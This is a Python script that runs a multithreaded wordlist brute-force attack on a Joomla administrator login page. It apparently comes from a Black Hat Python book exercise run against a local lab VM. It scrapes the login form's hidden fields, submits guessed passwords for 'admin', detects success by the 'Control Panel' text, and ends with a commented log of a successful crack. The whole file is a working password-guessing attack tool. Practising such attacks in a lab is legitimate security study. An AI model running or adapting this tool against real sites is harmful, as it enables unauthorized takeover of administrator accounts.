#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import re
import sys
import threading
import queue
from bs4 import BeautifulSoup

# general settings
user_thread   = 10
wordlist_file = "./cain.txt"
resume        = None

# target specific settings
# target_url    = "http://192.168.112.131/administrator/index.php"
# target_post   = "http://192.168.112.131/administrator/index.php"
target_url    = "http://192.168.17.129/Joomla/administrator/index.php"
target_post   = "http://192.168.17.129/Joomla/administrator/index.php"

username_field = "username"
password_field = "passwd"

username = "admin"
password = "han"

# success_check = "Administration - Control Panel"
success_check = "Control Panel" #Joomla_3.6.2-Stable-Full_Package
# success_check = "Control Panel - Joomla-Kali" #Joomla_3.6.2-Stable-Full_Package
# success_check = "Administration" #Joomla_3.6.2-Stable-Full_Package

def build_wordlist(wordlist_file):

    # read in the word list
    fd = open(wordlist_file,"rb") 
    raw_words = fd.readlines()
    fd.close()
    
    found_resume = False
    words        = queue.Queue()
    
    for word in raw_words:
        
        word = word.rstrip()
        
        if resume is not None:
            
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print("Resuming wordlist from: %s" % resume)
                                        
        else:
            words.put(word)
    
    return words

class Bruter(object):
    def __init__(self, username, words):
        
        self.username   = username
        self.password_q = words
        self.found      = False
        
        print("Finished setting up for: %s" % username)
        
    def run_bruteforce(self):
        
        for i in range(user_thread):
            # t = threading.Thread(target=self.web_bruter,args=(i))
                # self._target(*self._args, **self._kwargs)
            # TypeError: web_bruter() argument after * must be a sequence, not int
            # https://github.com/pydata/pandas/issues/3284
            # Due to ambiguity issues, the correct python grammer for a singleton tuple is (1,) not (1), which is just an expr wth the value 1.
            t = threading.Thread(target=self.web_bruter,args=(i,))
            t.start()
    
    def web_bruter(self, num):
        
        while not self.password_q.empty() and not self.found:
            # brute = self.password_q.get().rstrip()
            brute = self.password_q.get().rstrip().decode('utf-8') #convert 'bytes' object to str
            
            print("Trying: %s : %s (%d left), thread %d" % (self.username,brute,self.password_q.qsize(),num))
            
            s = requests.Session()
            r = s.get(target_url)
            # print(r.text)
            # soup = BeautifulSoup(r.text)
            soup = BeautifulSoup(r.text, "lxml")
        
        # http://stackoverflow.com/questions/33511544/how-to-get-rid-of-beautifulsoup-user-warning
            
        # /usr/local/lib/python3.5/dist-packages/bs4/__init__.py:181: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system ("lxml"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.
        # The code that caused this warning is on line 27 of the file requests_session.py. To get rid of this warning, change code that looks like this:
        # BeautifulSoup([your markup])
        # to this:
        # BeautifulSoup([your markup], "lxml")
        # markup_type=markup_type))
        
            input_all = soup.find_all('input')
            # print(len(input_all))
            # print(input_all)
        
            post_tags = {}
            for input in input_all:
                n = input['name']
                if input.has_attr('value'):
                    post_tags.setdefault(n, input['value'])
                else:
                    post_tags.setdefault(n)
            # print(post_tags)
            
            # BeautifulSoup Tag.has_attr
            # https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html#id30
            # Python dictionary setdefault
            # http://www.tutorialspoint.com/python/dictionary_setdefault.htm
            
            # add our username and password fields
            post_tags[username_field] = username
            post_tags[password_field] = brute
            
            res = s.post(target_post, cookies=r.cookies, data=post_tags)
            soup_post = BeautifulSoup(res.text, "lxml")
            h1_tag = soup_post.find_all('h1')
            # print(h1_tag)
        # [<h1 class="page-title">
        # <span class="icon-home-2 cpanel"></span>
                # Control Panel</h1>]
        
            # print(h1_tag[0])
        # <h1 class="page-title">
        # <span class="icon-home-2 cpanel"></span>
                # Control Panel</h1>
        
            # print(h1_tag[0].get_text())
            
            # print(h1_tag[0].string) #None
            # print(h1_tag[0].get_text().strip()) # Control Panel
        
            # h1_text = h1_tag[0].get_text().strip()
            
            # http://www.tutorialspoint.com/python/string_find.htm
            # print(h1_text.find(success_check)) # 0
            # print(h1_text.find("if")) # -1
            # print(res.text.find(success_check)) #345
    
            if res.text.find(success_check) != -1:
                self.found = True
                
                print("[*] Bruteforce successful.")
                print("[*] Username: %s" % username)
                print("[*] Password: %s" % brute)
                print("[*] Waiting for other threads to exit...")

def main():
    words = build_wordlist(wordlist_file)
    bruter_obj = Bruter(username,words)
    bruter_obj.run_bruteforce()
    
if __name__ == '__main__':
    main()
    
# han@kali:~/BHP-Code/Chapter5/python3-version$ python3 python3_requests_session_joomla_brute.py
# Finished setting up for: admin
# Trying: admin : !@#$% (306705 left)
# Trying: admin : !@#$%^ (306704 left)
# Trying: admin : !@#$%^& (306703 left)
# Trying: admin : !@#$%^&* (306702 left)
# Trying: admin : * (306701 left)
# Trying: admin : 0 (306700 left)
# Trying: admin : 0racl3 (306699 left)
# Trying: admin : 0racl38 (306698 left)
# Trying: admin : 0racl38i (306697 left)
# Trying: admin : 0racl39 (306696 left)
# Trying: admin : 0racl39i (306695 left)
# Trying: admin : 0racle (306694 left)
# Trying: admin : 0racle10 (306693 left)
# Trying: admin : 0racle10i (306692 left)
# Trying: admin : 0racle8 (306691 left)
# Trying: admin : 0racle8i (306690 left)
# Trying: admin : 0racle9 (306689 left)
# Trying: admin : 1 (306687 left)
# Trying: admin : 0racle9i (306688 left)
# Trying: admin : 1022 (306686 left)
# Trying: admin : 10sne1 (306685 left)
# Trying: admin : 111111 (306684 left)
# Trying: admin : 121212 (306683 left)
# Trying: admin : 1225 (306682 left)
# Trying: admin : 123 (306681 left)
# Trying: admin : 123123 (306680 left)
# Trying: admin : 1234 (306679 left)
# Trying: admin : 12345 (306678 left)
# Trying: admin : 123456 (306677 left)
# Trying: admin : 1234567 (306676 left)
# Trying: admin : 12345678 (306675 left)
# Trying: admin : 123456789 (306674 left)
# Trying: admin : 1234qwer (306673 left)
# Trying: admin : 123abc (306672 left)
# Trying: admin : 123go (306671 left)
# Trying: admin : 1313 (306670 left)
# Trying: admin : 131313 (306669 left)
# Trying: admin : 13579 (306668 left)
# Trying: admin : 14430 (306667 left)
# Trying: admin : 1701d (306666 left)
# Trying: admin : 1928 (306665 left)
# Trying: admin : 1951 (306664 left)
# Trying: admin : 199220706 (306663 left)
# Trying: admin : 1a2b3c (306662 left)
# Trying: admin : 1p2o3i (306661 left)
# Trying: admin : 1qw23e (306659 left)
# Trying: admin : 1q2w3e (306660 left)
# Trying: admin : 1sanjose (306658 left)
# Trying: admin : 20 (306656 left)
# Trying: admin : 2 (306657 left)
# Trying: admin : han (306655 left)
# Trying: admin : 2000 (306654 left)
# Trying: admin : 2001 (306653 left)
# Trying: admin : 2002 (306652 left)
# Trying: admin : 2003 (306651 left)
# Trying: admin : 2112 (306650 left)
# Trying: admin : 21122112 (306649 left)
# Trying: admin : 2222 (306648 left)
# Trying: admin : 246 (306647 left)
# Trying: admin : 249 (306646 left)
# Trying: admin : 2welcome (306645 left)
# Trying: admin : 369 (306644 left)
# [*] Bruteforce successful.
# [*] Username: admin
# [*] Password: han
# [*] Waiting for other threads to exit...
